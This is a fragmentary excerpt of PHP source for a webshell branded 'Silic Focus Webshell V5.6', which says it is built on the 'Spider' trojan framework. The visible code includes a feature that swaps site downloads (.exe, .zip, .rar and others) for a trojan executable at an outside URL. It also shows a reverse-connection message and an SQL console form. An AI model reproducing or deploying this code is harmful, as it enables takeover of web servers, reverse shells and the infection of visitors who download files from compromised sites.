...
function showth(th){
	...
	if(th == 'b') document.getElementById('setauto').innerHTML = '<br>下载后缀 <input type="text" name="tca" id="tca" value=".exe|.7z|.rar|.zip|.gz|.txt" style="width:500px;"><br><br>替换成为 <input type="text" name="tcb" id="tcb" value="http://silic.wiki/muma.exe" style="width:500px;">';
	return true;
}
function autoup(){
...
$message=" Silic Focus PHP反弹连接 - silic.wiki \n";
...
更多过于PostgreSQL语句可参见<a href="https://silic.wiki" target="_blank">[这里]</a><br><hr></p>
...
<font style="font-size:10pt;">&nbsp;&nbsp;<a href="https://silic.wiki" target="_blank">Silic Focus</a></font></form>
<!--SQL表单结束-->
END;
...
* 本程序由<a href="https://silic.wiki" _target"_blank">Silic Focus</a>基于Spider木马开发，本版是基于Spider木马框架的第五次重新开发<br>
...
* <a href="https://silic.wiki" target="_blank">Silic.Wiki</a><br><br>
...
print<<<END
<html><head><title>Silic Focus - Silic.Wiki</title>
<style type="text/css">
*{padding:0; margin:0;}
...
<div class="footer"> Powered By <a href="https://silic.wiki/" target="_blank">Silic Focus</a> [ https://silic.wiki ] - Webshell V5.6</div></div></body></html>
END;
return false;
}
}
